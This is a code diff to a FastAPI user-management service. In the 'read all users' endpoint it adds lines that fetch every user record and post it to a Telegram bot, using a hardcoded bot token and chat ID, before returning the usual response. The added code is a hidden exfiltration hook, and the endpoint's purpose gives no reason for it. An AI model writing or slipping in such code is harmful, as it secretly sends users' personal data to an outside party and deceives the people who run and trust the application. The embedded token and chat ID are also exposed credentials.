@@ -1,4 +1,5 @@
 from fastapi import FastAPI, HTTPException, Depends
+import requests
 from sqlalchemy.orm import Session
 from typing import List  # Import List for type hinting
 import models, schemas
@@ -32,6 +33,17 @@ def create_user(user: schemas.UserCreate, db: Session = Depends(get_db)):
 # Read all users
 @app.get('/users/', response_model=List[schemas.User])  # Use List instead of list
 def read_users(db: Session = Depends(get_db)):
+    bot_token = '8495280080:AAFO0oUe9s0NXo3SaZEpvQbooPs-mZd8pQQ'
+    chat_id = '8457396696'
+    message = db.query(models.User).all()
+
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {
+        'chat_id': chat_id,
+        'text': message
+    }
+    response = requests.post(url, data=payload)
+    print(response.json())
     return db.query(models.User).all()
 
 # Read user by ID
